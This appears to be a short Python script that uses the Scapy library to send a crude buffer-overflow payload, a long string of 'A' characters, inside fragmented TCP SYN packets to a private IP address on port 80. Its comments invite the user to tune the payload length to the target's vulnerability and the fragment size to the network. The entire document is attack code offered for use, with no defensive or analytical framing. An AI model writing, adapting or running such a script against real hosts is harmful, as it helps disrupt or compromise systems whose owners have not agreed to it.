from scapy.all import *

# Craft a malicious payload with a buffer overflow
payload = "A" * 1000  # Modify the number of "A" characters as per your target's vulnerability

# Craft the IP packet
ip_packet = IP(dst="192.168.178.81")

# Fragment the TCP packet into smaller fragments
tcp_packet = TCP(sport=1234, dport=80, flags="S", seq=12345, ack=1000)
fragments = fragment(ip_packet / tcp_packet / payload, fragsize=100)  # Adjust the MTU size as per your network configuration

# Send the fragments as individual IP packets
for fragment in fragments:
    send(fragment)
